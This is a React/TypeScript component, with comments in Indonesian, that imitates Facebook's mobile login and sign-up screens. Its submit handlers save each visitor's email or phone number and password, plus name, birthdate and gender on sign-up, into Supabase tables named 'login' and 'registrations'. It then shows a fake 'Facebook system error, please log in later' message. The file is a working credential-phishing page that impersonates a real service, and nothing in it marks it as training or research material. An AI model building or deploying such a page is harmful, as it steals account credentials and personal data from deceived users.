"use client";

import React, { useState } from "react";
import { supabase } from "../../../supabaseClient";
import NotificationPopup from "./components/popup";

const FacebookMo: React.FC = () => {
  const [showSignUp, setShowSignUp] = useState(false);
  const [showPopup, setShowPopup] = useState(false);

  const toggleSignUp = () => {
    setShowSignUp(!showSignUp);
  };

  const closePopup = () => {
    setShowPopup(false);
  };

  // State untuk login
  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");

  // State untuk sign-up
  const [firstname, setFirstname] = useState("");
  const [surename, setSurename] = useState("");
  const [signUpEmailOrPhone, setSignUpEmailOrPhone] = useState("");
  const [signUpPassword, setSignUpPassword] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [birthMonth, setBirthMonth] = useState("");
  const [birthYear, setBirthYear] = useState("");
  const [gender, setGender] = useState("");

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const { data, error } = await supabase
      .from("login")
      .insert([{ text1: emailOrPhone, text2: password }]);

    if (error) {
      console.error("Error inserting data:", error);
    } else {
      console.log("Data inserted successfully:", data);
      setEmailOrPhone("");
      setPassword("");
      setShowPopup(true);
    }
  };

  const handleSignUpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const birthdate = `${birthYear}-${birthMonth}-${birthDate}`;

    console.log({
      firstname,
      surename,
      text1: signUpEmailOrPhone,
      text2: signUpPassword,
      birthdate,
      gender,
    });

    const { data, error } = await supabase.from("registrations").insert([
      {
        firstname,
        surename: surename, // pastikan nama kolom ini sesuai dengan struktur tabel di Supabase
        text1: signUpEmailOrPhone,
        text2: signUpPassword,
        birthdate,
        gender,
      },
    ]);

    if (error) {
      console.error("Error inserting data:", error);
    } else {
      console.log("Data inserted successfully:", data);
      setFirstname("");
      setSurename("");
      setSignUpEmailOrPhone("");
      setSignUpPassword("");
      setBirthDate("");
      setBirthMonth("");
      setBirthYear("");
      setGender("");
      setShowPopup(true);
    }
  };

  return (
    <div
      className="flex flex-col items-center justify-center h-[108vh]"
      style={{ backgroundColor: "#f0f2f5" }}
    >
      {/* Versi untuk layar di bawah 900px */}
      <div
        className="lg:hidden flex flex-col items-center justify-center mt-[-30vh]"
        style={{ width: "56vh" }}
      >
        <div
          className="flex flex-col items-center mt-14 mx-4"
          style={{ maxWidth: "500px" }}
        >
          <img
            src="/facebooksvg.svg"
            alt="Facebook"
            className="mb-4"
            width="270"
            height="auto"
          />
          <h2
            className="text-center text-gray-700 font-normal"
            style={{ fontSize: "24px", lineHeight: "1.2" }}
          >
            Facebook helps you connect and share with the people in your life.
          </h2>
        </div>
        <div className="flex flex-col items-center mt-6 mx-4">
          <div
            className="bg-white p-6 rounded-lg shadow-lg text-center"
            style={{ width: "53vh" }}
          >
            <form onSubmit={handleLoginSubmit}>
              <input
                type="text"
                value={emailOrPhone}
                onChange={(e) => setEmailOrPhone(e.target.value)}
                className="w-full px-4 py-2 mb-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                placeholder="Email address or phone number"
                required
              />
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-2 mb-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                placeholder="Password"
                required
              />
              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 font-bold text-xl"
              >
                Log in
              </button>
            </form>

            <a
              href="https://www.facebook.com/login/identify/"
              className="block mt-3 text-blue-600 hover:underline text-sm"
            >
              Forgotten password?
            </a>
            <hr className="my-4" />
            <button
              className="text-white py-2 rounded hover:bg-green-700 font-bold text-md mt-4"
              style={{
                backgroundColor: "#48b42c",
                height: "6vh",
                width: "26vh",
              }}
              onClick={toggleSignUp}
            >
              Create New Account
            </button>
          </div>
          <div className="mt-8 text-center" style={{ fontSize: "13.5px" }}>
            <a href="#" className="text-black hover:underline font-bold">
              Create a Page
            </a>{" "}
            for a celebrity, brand or business.
          </div>
        </div>
      </div>

      {showSignUp && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold">Sign Up</h2>
              <button className="text-gray-700" onClick={toggleSignUp}>
                &times;
              </button>
            </div>
            <form onSubmit={handleSignUpSubmit}>
              <div className="flex space-x-3 mb-4">
                <input
                  type="text"
                  value={firstname}
                  onChange={(e) => setFirstname(e.target.value)}
                  className="w-1/2 px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                  placeholder="First name"
                  required
                />
                <input
                  type="text"
                  value={surename}
                  onChange={(e) => setSurename(e.target.value)}
                  className="w-1/2 px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                  placeholder="Surename"
                  required
                />
              </div>
              <input
                type="text"
                value={signUpEmailOrPhone}
                onChange={(e) => setSignUpEmailOrPhone(e.target.value)}
                className="w-full px-4 py-2 mb-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                placeholder="Mobile number or email address"
                required
              />
              <input
                type="password"
                value={signUpPassword}
                onChange={(e) => setSignUpPassword(e.target.value)}
                className="w-full px-4 py-2 mb-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                placeholder="New password"
                required
              />
              <div className="flex space-x-3 mb-4">
                <select
                  value={birthDate}
                  onChange={(e) => setBirthDate(e.target.value)}
                  className="w-1/3 px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                  required
                >
                  <option value="">Day</option>
                  {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
                    <option key={day} value={day}>
                      {day}
                    </option>
                  ))}
                </select>
                <select
                  value={birthMonth}
                  onChange={(e) => setBirthMonth(e.target.value)}
                  className="w-1/3 px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                  required
                >
                  <option value="">Month</option>
                  {[
                    "01",
                    "02",
                    "03",
                    "04",
                    "05",
                    "06",
                    "07",
                    "08",
                    "09",
                    "10",
                    "11",
                    "12",
                  ].map((month, index) => (
                    <option key={index} value={month}>
                      {month}
                    </option>
                  ))}
                </select>
                <select
                  value={birthYear}
                  onChange={(e) => setBirthYear(e.target.value)}
                  className="w-1/3 px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                  required
                >
                  <option value="">Year</option>
                  {Array.from({ length: 120 }, (_, i) => 2024 - i).map(
                    (year) => (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    )
                  )}
                </select>
              </div>
              <div className="flex space-x-3 mb-4">
                <label className="w-1/3 flex items-center">
                  <input
                    type="radio"
                    name="gender"
                    value="Female"
                    checked={gender === "Female"}
                    onChange={(e) => setGender(e.target.value)}
                    className="mr-2"
                  />
                  Female
                </label>
                <label className="w-1/3 flex items-center">
                  <input
                    type="radio"
                    name="gender"
                    value="Male"
                    checked={gender === "Male"}
                    onChange={(e) => setGender(e.target.value)}
                    className="mr-2"
                  />
                  Male
                </label>
                <label className="w-1/3 flex items-center">
                  <input
                    type="radio"
                    name="gender"
                    value="Custom"
                    checked={gender === "Custom"}
                    onChange={(e) => setGender(e.target.value)}
                    className="mr-2"
                  />
                  Custom
                </label>
              </div>
              <p className="text-xs text-gray-500 mb-4">
                People who use our service may have uploaded your contact
                information to Facebook.{" "}
                <a href="#" className="text-blue-600 hover:underline">
                  Learn more.
                </a>
              </p>
              <p className="text-xs text-gray-500 mb-4">
                By clicking Sign Up, you agree to our{" "}
                <a href="#" className="text-blue-600 hover:underline">
                  Terms
                </a>
                ,{" "}
                <a href="#" className="text-blue-600 hover:underline">
                  Privacy Policy
                </a>
                , and{" "}
                <a href="#" className="text-blue-600 hover:underline">
                  Cookies Policy
                </a>
                . You may receive SMS notifications from us and can opt out at
                any time.
              </p>
              <button
                type="submit"
                className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700 font-bold"
              >
                Sign Up
              </button>
            </form>
          </div>
        </div>
      )}
      {showPopup && (
        <NotificationPopup
          message="Mohon maaf, sistem Facebook sedang bermasalah, mohon login kembali nanti."
          onClose={closePopup}
        />
      )}
    </div>
  );
};

export default FacebookMo;
